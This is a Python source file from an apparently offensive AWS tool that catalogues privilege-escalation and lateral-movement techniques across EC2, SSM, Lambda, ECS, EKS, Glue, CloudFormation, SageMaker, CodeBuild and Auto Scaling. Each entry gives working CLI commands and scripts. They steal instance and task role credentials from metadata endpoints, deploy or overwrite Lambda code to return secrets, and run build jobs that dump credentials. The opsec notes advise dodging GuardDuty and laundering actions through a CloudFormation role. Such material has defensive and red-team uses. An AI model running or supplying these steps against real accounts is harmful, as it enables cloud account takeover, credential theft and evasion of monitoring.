"""Compute edges: lateral movement and PassRole-consuming privilege escalation
across EC2, SSM, Lambda, ECS, EKS, Glue, CloudFormation, SageMaker, CodeBuild.

The recurring pattern is iam:PassRole + a service "create/run" permission: you
hand a more-privileged role to a compute service you control, then read that
role's credentials out of the running workload (IMDS, env vars, task metadata).
This is the cloud equivalent of ADPwn's AdminTo -> dump-LSASS chain.
"""

from ..models import AbuseInfo, AbuseStep, BlastRadius, Platform

ABUSE_DB: dict[str, AbuseInfo] = {}


def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="") -> AbuseStep:
    return AbuseStep(
        description=desc,
        command=cmd,
        platform=Platform.LINUX,
        tool=tool,
        blast_radius=blast,
        api=api,
        opsec_note=opsec,
    )


# ─── RunInstanceWithRole ────────────────────────────────────────────────────

ABUSE_DB["RunInstanceWithRole"] = AbuseInfo(
    edge_kind="RunInstanceWithRole",
    description=(
        "ec2:RunInstances + iam:PassRole lets you launch an instance carrying a "
        "privileged instance profile, then read that role's credentials from "
        "the Instance Metadata Service. You gain the role without ever being "
        "allowed to assume it directly."
    ),
    required_permissions=["ec2:RunInstances", "iam:PassRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Spins up a real, billable instance and generates RunInstances in "
        "CloudTrail. Use --user-data to exfil IMDS creds automatically, or pair "
        "with SSM. GuardDuty flags credential exfiltration when the role's "
        "creds are then used off the instance "
        "(UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration)."
    ),
    linux_steps=[
        _s(
            "Launch an instance with the target role and a user-data exfil script",
            "aws ec2 run-instances {AWS_AUTH} \\\n"
            "  --image-id '{AMI_ID}' --instance-type t3.micro --count 1 \\\n"
            "  --iam-instance-profile Name='{INSTANCE_PROFILE_NAME}' \\\n"
            "  --user-data 'file://exfil.sh'",
            api="ec2:RunInstances",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "exfil.sh - pull role creds from IMDSv2 and beacon them out",
            "TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 600')\n"
            "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n"
            "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE",
            tool="curl",
        ),
        AbuseStep(
            description="Cleanup: terminate the instance you launched",
            command="aws ec2 terminate-instances {AWS_AUTH} --instance-ids '{INSTANCE_ID}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.DESTRUCTIVE,
            api="ec2:TerminateInstances",
            is_cleanup=True,
        ),
    ],
)


# ─── SSMSendCommand ─────────────────────────────────────────────────────────

ABUSE_DB["SSMSendCommand"] = AbuseInfo(
    edge_kind="SSMSendCommand",
    description=(
        "ssm:SendCommand runs arbitrary commands as root/SYSTEM on any managed "
        "instance with the SSM agent. Code execution on the host, and from "
        "there its instance-role credentials via IMDS - no SSH key or open "
        "port required."
    ),
    required_permissions=["ssm:SendCommand", "ssm:GetCommandInvocation"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EC2Instance"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "SendCommand and its output are logged in CloudTrail and (if enabled) "
        "SSM command history. Runs as root by default. Commands and their "
        "stdout can be captured by SSM logging to S3/CloudWatch."
    ),
    linux_steps=[
        _s(
            "Run a command on the instance and capture the command id",
            "aws ssm send-command {AWS_AUTH} \\\n"
            "  --document-name AWS-RunShellScript \\\n"
            "  --instance-ids '{INSTANCE_ID}' \\\n"
            "  --parameters 'commands=[\"curl -s -H \\\"X-aws-ec2-metadata-token: $(curl -sX PUT http://169.254.169.254/latest/api/token -H \\\\\\\"X-aws-ec2-metadata-token-ttl-seconds: 600\\\\\\\")\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\"]'",
            api="ssm:SendCommand",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Read the command output (the role's temporary credentials)",
            "aws ssm get-command-invocation {AWS_AUTH} \\\n"
            "  --command-id '{COMMAND_ID}' --instance-id '{INSTANCE_ID}'",
            api="ssm:GetCommandInvocation",
        ),
    ],
)


# ─── SSMStartSession ────────────────────────────────────────────────────────

ABUSE_DB["SSMStartSession"] = AbuseInfo(
    edge_kind="SSMStartSession",
    description=(
        "ssm:StartSession opens an interactive shell on a managed instance "
        "through Session Manager. Interactive equivalent of SendCommand."
    ),
    required_permissions=["ssm:StartSession"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EC2Instance"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Requires the session-manager-plugin locally. Session start/end is "
        "logged; interactive keystroke logging is optional but common in "
        "hardened environments."
    ),
    linux_steps=[
        _s(
            "Open an interactive session on the instance",
            "aws ssm start-session {AWS_AUTH} --target '{INSTANCE_ID}'",
            api="ssm:StartSession",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── IMDSCredentialTheft ────────────────────────────────────────────────────

ABUSE_DB["IMDSCredentialTheft"] = AbuseInfo(
    edge_kind="IMDSCredentialTheft",
    description=(
        "Once you have code execution on an EC2 instance (via SSM, SSRF, or a "
        "shell), the Instance Metadata Service hands out the instance role's "
        "temporary credentials to anyone who can reach 169.254.169.254. This "
        "is the on-host step that turns compute access into an identity."
    ),
    required_permissions=[],
    source_kinds=["EC2Instance"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Reading IMDS on the box is invisible to CloudTrail. USING the stolen "
        "creds off the instance is what GuardDuty catches "
        "(InstanceCredentialExfiltration) - it compares the calling IP to the "
        "instance's expected IP. Route calls through the instance to stay quiet."
    ),
    linux_steps=[
        _s(
            "IMDSv2: get a token, then read the role credentials",
            "TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 600')\n"
            "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n"
            "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE",
            tool="curl",
        ),
        _s(
            "IMDSv1 (if the instance still allows it): single unauthenticated GET",
            "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
            tool="curl",
        ),
    ],
)


# ─── EC2InstanceConnectSSH ──────────────────────────────────────────────────

ABUSE_DB["EC2InstanceConnectSSH"] = AbuseInfo(
    edge_kind="EC2InstanceConnectSSH",
    description=(
        "ec2-instance-connect:SendSSHPublicKey pushes a temporary public key to "
        "an instance's OS user, giving you a 60-second window to SSH in with "
        "the matching private key."
    ),
    required_permissions=["ec2-instance-connect:SendSSHPublicKey"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EC2Instance"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Needs network reachability to port 22 (SG + routing). SendSSHPublicKey "
        "is logged; the subsequent SSH login is only on the host, not in "
        "CloudTrail."
    ),
    linux_steps=[
        _s(
            "Push an ephemeral SSH key to the instance's OS user",
            "aws ec2-instance-connect send-ssh-public-key {AWS_AUTH} \\\n"
            "  --instance-id '{INSTANCE_ID}' --instance-os-user ec2-user \\\n"
            "  --ssh-public-key file://key.pub --availability-zone '{AZ}'",
            api="ec2-instance-connect:SendSSHPublicKey",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "SSH in within the 60s window, then steal IMDS creds",
            "ssh -i key ec2-user@{INSTANCE_IP}",
            tool="ssh",
        ),
    ],
)


# ─── CreateLambdaWithRole ───────────────────────────────────────────────────

ABUSE_DB["CreateLambdaWithRole"] = AbuseInfo(
    edge_kind="CreateLambdaWithRole",
    description=(
        "lambda:CreateFunction + iam:PassRole lets you deploy a function that "
        "runs as a privileged execution role, then read that role's "
        "credentials from the function's environment and print them back."
    ),
    required_permissions=[
        "lambda:CreateFunction",
        "lambda:InvokeFunction",
        "iam:PassRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Leaves a function behind - delete it in cleanup. The execution role's "
        "creds are available inside the runtime as AWS_ACCESS_KEY_ID / "
        "AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN env vars."
    ),
    linux_steps=[
        _s(
            "Deploy a function that returns its own execution-role credentials",
            "aws lambda create-function {AWS_AUTH} \\\n"
            "  --function-name '{FUNCTION_NAME}' \\\n"
            "  --runtime python3.12 --handler index.handler \\\n"
            "  --role '{ROLE_ARN}' \\\n"
            "  --zip-file fileb://exfil.zip",
            api="lambda:CreateFunction",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "index.py - return the ambient credentials",
            "import os\n"
            "def handler(e, c):\n"
            "    return {k: os.environ[k] for k in "
            "('AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN')}",
            tool="python",
        ),
        _s(
            "Invoke it and read the creds from the response",
            "aws lambda invoke {AWS_AUTH} --function-name '{FUNCTION_NAME}' out.json && cat out.json",
            api="lambda:InvokeFunction",
        ),
        AbuseStep(
            description="Cleanup: delete the function",
            command="aws lambda delete-function {AWS_AUTH} --function-name '{FUNCTION_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="lambda:DeleteFunction",
            is_cleanup=True,
        ),
    ],
)


# ─── UpdateLambdaCode ───────────────────────────────────────────────────────

ABUSE_DB["UpdateLambdaCode"] = AbuseInfo(
    edge_kind="UpdateLambdaCode",
    description=(
        "lambda:UpdateFunctionCode overwrites the code of an EXISTING function, "
        "which keeps running as its current (possibly privileged) execution "
        "role. You inherit that role without needing PassRole at all."
    ),
    required_permissions=["lambda:UpdateFunctionCode"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["LambdaFunction"],
    blast_radius=BlastRadius.DESTRUCTIVE,
    opsec_considerations=(
        "Overwrites production code - capture the original with GetFunction "
        "(CodeSha256 + a download of the deployment package) before writing, or "
        "you cannot restore it. Triggers on the function's normal invocation "
        "path, so effects can be subtle and hard to undo cleanly."
    ),
    linux_steps=[
        _s(
            "Back up the current code location and hash",
            "aws lambda get-function {AWS_AUTH} --function-name '{FUNCTION_NAME}' \\\n"
            "  --query 'Code.Location'",
            api="lambda:GetFunction",
        ),
        _s(
            "Overwrite with your payload",
            "aws lambda update-function-code {AWS_AUTH} \\\n"
            "  --function-name '{FUNCTION_NAME}' \\\n"
            "  --zip-file fileb://payload.zip",
            api="lambda:UpdateFunctionCode",
            blast=BlastRadius.DESTRUCTIVE,
        ),
    ],
)


# ─── InvokeLambda ───────────────────────────────────────────────────────────

ABUSE_DB["InvokeLambda"] = AbuseInfo(
    edge_kind="InvokeLambda",
    description=(
        "lambda:InvokeFunction on a function whose code already does something "
        "privileged (or whose event you can control to inject input) can be an "
        "escalation in its own right, depending on what the function does."
    ),
    required_permissions=["lambda:InvokeFunction"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["LambdaFunction"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Invocation alone is low-signal. Value depends entirely on what the "
        "function does with attacker-influenced input - review its code/env "
        "first."
    ),
    linux_steps=[
        _s(
            "Invoke with a controlled payload",
            "aws lambda invoke {AWS_AUTH} --function-name '{FUNCTION_NAME}' \\\n"
            "  --payload '{PAYLOAD_JSON}' out.json && cat out.json",
            api="lambda:InvokeFunction",
        ),
    ],
)


# ─── ECSRunTaskWithRole ─────────────────────────────────────────────────────

ABUSE_DB["ECSRunTaskWithRole"] = AbuseInfo(
    edge_kind="ECSRunTaskWithRole",
    description=(
        "ecs:RunTask + iam:PassRole runs a container task under a privileged "
        "task role. The container reads its role creds from the ECS task "
        "metadata endpoint (169.254.170.2)."
    ),
    required_permissions=["ecs:RunTask", "iam:PassRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Needs a cluster with capacity (Fargate or registered EC2). Task creds "
        "come from $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI, not IMDS."
    ),
    linux_steps=[
        _s(
            "Run a task with the target task role",
            "aws ecs run-task {AWS_AUTH} \\\n"
            "  --cluster '{CLUSTER}' \\\n"
            "  --task-definition '{TASK_DEF}' \\\n"
            "  --launch-type FARGATE \\\n"
            "  --overrides '{\"taskRoleArn\":\"{ROLE_ARN}\"}'",
            api="ecs:RunTask",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Inside the container: read task-role creds from the ECS endpoint",
            "curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
            tool="curl",
        ),
    ],
)


# ─── ECSRegisterTaskDefinition ──────────────────────────────────────────────

ABUSE_DB["ECSRegisterTaskDefinition"] = AbuseInfo(
    edge_kind="ECSRegisterTaskDefinition",
    description=(
        "ecs:RegisterTaskDefinition (+ PassRole + RunTask) lets you define your "
        "own container image and command running under a chosen task role."
    ),
    required_permissions=[
        "ecs:RegisterTaskDefinition",
        "ecs:RunTask",
        "iam:PassRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Task definitions persist as new revisions - deregister in cleanup.",
    linux_steps=[
        _s(
            "Register a task definition with your image and the target role",
            "aws ecs register-task-definition {AWS_AUTH} \\\n"
            "  --family '{FAMILY}' --task-role-arn '{ROLE_ARN}' \\\n"
            "  --requires-compatibilities FARGATE --network-mode awsvpc \\\n"
            "  --cpu 256 --memory 512 \\\n"
            "  --container-definitions '{CONTAINER_DEFS}'",
            api="ecs:RegisterTaskDefinition",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── ECSExecCommand ─────────────────────────────────────────────────────────

ABUSE_DB["ECSExecCommand"] = AbuseInfo(
    edge_kind="ECSExecCommand",
    description=(
        "ecs:ExecuteCommand (ECS Exec) opens a shell inside an already-running "
        "container, inheriting its task role."
    ),
    required_permissions=["ecs:ExecuteCommand"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["ECSCluster"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Requires enableExecuteCommand on the task. Logged via SSM.",
    linux_steps=[
        _s(
            "Exec into a running task container",
            "aws ecs execute-command {AWS_AUTH} \\\n"
            "  --cluster '{CLUSTER}' --task '{TASK_ID}' \\\n"
            "  --container '{CONTAINER}' --interactive --command /bin/sh",
            api="ecs:ExecuteCommand",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── EKSClusterAccess ───────────────────────────────────────────────────────

ABUSE_DB["EKSClusterAccess"] = AbuseInfo(
    edge_kind="EKSClusterAccess",
    description=(
        "eks:DescribeCluster + a mapped IAM identity (or "
        "eks:AccessKubernetesApi / an access entry) yields kubectl access. From "
        "there, pod service accounts and node instance roles are further "
        "escalation surface."
    ),
    required_permissions=["eks:DescribeCluster"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EKSCluster"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "aws-auth ConfigMap or EKS access entries decide what your IAM identity "
        "maps to in-cluster. Kube API audit logs (if enabled) capture "
        "everything you do with kubectl."
    ),
    linux_steps=[
        _s(
            "Write a kubeconfig for the cluster",
            "aws eks update-kubeconfig {AWS_AUTH} --name '{CLUSTER}'",
            api="eks:DescribeCluster",
        ),
        _s(
            "Probe your in-cluster permissions",
            "kubectl auth can-i --list",
            tool="kubectl",
        ),
    ],
)


# ─── GlueCreateDevEndpoint / GlueUpdateDevEndpoint ──────────────────────────

ABUSE_DB["GlueCreateDevEndpoint"] = AbuseInfo(
    edge_kind="GlueCreateDevEndpoint",
    description=(
        "glue:CreateDevEndpoint + iam:PassRole provisions a Glue development "
        "endpoint running as a chosen role; SSH in and read the role creds from "
        "the endpoint's metadata."
    ),
    required_permissions=["glue:CreateDevEndpoint", "iam:PassRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Dev endpoints are slow to spin up and billable - delete in cleanup.",
    linux_steps=[
        _s(
            "Create a dev endpoint with the target role",
            "aws glue create-dev-endpoint {AWS_AUTH} \\\n"
            "  --endpoint-name '{ENDPOINT}' --role-arn '{ROLE_ARN}' \\\n"
            "  --public-key file://key.pub",
            api="glue:CreateDevEndpoint",
            blast=BlastRadius.MUTATE,
        ),
    ],
)

ABUSE_DB["GlueUpdateDevEndpoint"] = AbuseInfo(
    edge_kind="GlueUpdateDevEndpoint",
    description=(
        "glue:UpdateDevEndpoint pushes a new public key (or libraries) to an "
        "existing dev endpoint, granting SSH access to a box already running as "
        "a privileged role."
    ),
    required_permissions=["glue:UpdateDevEndpoint"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["GlueDevEndpoint"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="No PassRole needed - the endpoint already has its role.",
    linux_steps=[
        _s(
            "Add your SSH key to the existing endpoint",
            "aws glue update-dev-endpoint {AWS_AUTH} \\\n"
            "  --endpoint-name '{ENDPOINT}' \\\n"
            "  --add-public-keys file://key.pub",
            api="glue:UpdateDevEndpoint",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── CloudFormationCreateStack ──────────────────────────────────────────────

ABUSE_DB["CloudFormationCreateStack"] = AbuseInfo(
    edge_kind="CloudFormationCreateStack",
    description=(
        "cloudformation:CreateStack + iam:PassRole executes a template using a "
        "privileged CloudFormation service role. The template can create IAM "
        "resources, run compute, or otherwise act with the role's permissions."
    ),
    required_permissions=["cloudformation:CreateStack", "iam:PassRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Everything the template does is attributed to the CFN role, not you - "
        "useful for laundering actions. The stack is a durable artifact; delete "
        "it in cleanup."
    ),
    linux_steps=[
        _s(
            "Create a stack that provisions an admin role, run with the CFN role",
            "aws cloudformation create-stack {AWS_AUTH} \\\n"
            "  --stack-name '{STACK}' \\\n"
            "  --template-body file://escalate.yaml \\\n"
            "  --role-arn '{ROLE_ARN}' \\\n"
            "  --capabilities CAPABILITY_NAMED_IAM",
            api="cloudformation:CreateStack",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: delete the stack",
            command="aws cloudformation delete-stack {AWS_AUTH} --stack-name '{STACK}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="cloudformation:DeleteStack",
            is_cleanup=True,
        ),
    ],
)


# ─── SageMakerCreateNotebook ────────────────────────────────────────────────

ABUSE_DB["SageMakerCreateNotebook"] = AbuseInfo(
    edge_kind="SageMakerCreateNotebook",
    description=(
        "sagemaker:CreateNotebookInstance + iam:PassRole + "
        "CreatePresignedNotebookInstanceUrl gives you a Jupyter notebook "
        "running as a privileged role - a shell with the role's credentials."
    ),
    required_permissions=[
        "sagemaker:CreateNotebookInstance",
        "sagemaker:CreatePresignedNotebookInstanceUrl",
        "iam:PassRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Billable ML instance - delete in cleanup. Notebook has full role creds.",
    linux_steps=[
        _s(
            "Create a notebook instance with the target role",
            "aws sagemaker create-notebook-instance {AWS_AUTH} \\\n"
            "  --notebook-instance-name '{NOTEBOOK}' \\\n"
            "  --instance-type ml.t3.medium --role-arn '{ROLE_ARN}'",
            api="sagemaker:CreateNotebookInstance",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Get a presigned URL and open a terminal in Jupyter",
            "aws sagemaker create-presigned-notebook-instance-url {AWS_AUTH} \\\n"
            "  --notebook-instance-name '{NOTEBOOK}'",
            api="sagemaker:CreatePresignedNotebookInstanceUrl",
        ),
    ],
)


# ─── CodeBuildCreateProject ─────────────────────────────────────────────────

ABUSE_DB["CodeBuildCreateProject"] = AbuseInfo(
    edge_kind="CodeBuildCreateProject",
    description=(
        "codebuild:CreateProject + iam:PassRole + StartBuild runs a build "
        "buildspec as a privileged service role; the buildspec can print the "
        "ambient credentials or act directly."
    ),
    required_permissions=[
        "codebuild:CreateProject",
        "codebuild:StartBuild",
        "iam:PassRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Build logs go to CloudWatch - credentials echoed there are recoverable but also visible.",
    linux_steps=[
        _s(
            "Create a project whose buildspec exfils the role creds",
            "aws codebuild create-project {AWS_AUTH} \\\n"
            "  --name '{PROJECT}' --service-role '{ROLE_ARN}' \\\n"
            "  --artifacts type=NO_ARTIFACTS \\\n"
            "  --environment 'type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL' \\\n"
            "  --source 'type=NO_SOURCE,buildspec=version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - env | grep AWS_'",
            api="codebuild:CreateProject",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Start the build",
            "aws codebuild start-build {AWS_AUTH} --project-name '{PROJECT}'",
            api="codebuild:StartBuild",
        ),
        AbuseStep(
            description="Cleanup: delete the project",
            command="aws codebuild delete-project {AWS_AUTH} --name '{PROJECT}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="codebuild:DeleteProject",
            is_cleanup=True,
        ),
    ],
)


# ─── AutoScalingCreateLaunchConfig ──────────────────────────────────────────

ABUSE_DB["AutoScalingCreateLaunchConfig"] = AbuseInfo(
    edge_kind="AutoScalingCreateLaunchConfig",
    description=(
        "autoscaling:CreateLaunchConfiguration + iam:PassRole (+ "
        "CreateAutoScalingGroup) launches instances carrying a privileged "
        "instance profile - a PassRole path that sidesteps ec2:RunInstances."
    ),
    required_permissions=[
        "autoscaling:CreateLaunchConfiguration",
        "autoscaling:CreateAutoScalingGroup",
        "iam:PassRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Useful when RunInstances is denied but ASG APIs are not. Instances are billable.",
    linux_steps=[
        _s(
            "Create a launch config with the target instance profile + user-data",
            "aws autoscaling create-launch-configuration {AWS_AUTH} \\\n"
            "  --launch-configuration-name '{LC_NAME}' \\\n"
            "  --image-id '{AMI_ID}' --instance-type t3.micro \\\n"
            "  --iam-instance-profile '{INSTANCE_PROFILE_NAME}' \\\n"
            "  --user-data file://exfil.sh",
            api="autoscaling:CreateLaunchConfiguration",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Create an ASG that launches one instance from it",
            "aws autoscaling create-auto-scaling-group {AWS_AUTH} \\\n"
            "  --auto-scaling-group-name '{ASG_NAME}' \\\n"
            "  --launch-configuration-name '{LC_NAME}' \\\n"
            "  --min-size 1 --max-size 1 --desired-capacity 1 \\\n"
            "  --vpc-zone-identifier '{SUBNET_ID}'",
            api="autoscaling:CreateAutoScalingGroup",
            blast=BlastRadius.MUTATE,
        ),
    ],
)
